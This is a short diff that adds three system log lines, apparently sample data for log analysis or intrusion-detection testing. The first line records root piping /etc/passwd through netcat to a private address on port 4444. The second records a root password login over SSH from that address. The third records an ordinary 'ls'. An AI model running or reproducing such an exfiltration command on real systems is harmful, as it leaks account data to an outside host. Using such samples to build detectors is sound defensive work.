@@ -1,0 +1,3 @@
+Jul 12 13:05:12 host sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c 'cat /etc/passwd | nc 192.168.1.150 4444'
+Jul 12 13:06:45 host sshd[2021]: Accepted password for root from 192.168.1.150 port 49210 ssh2
+Jul 12 13:07:10 host sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/ls
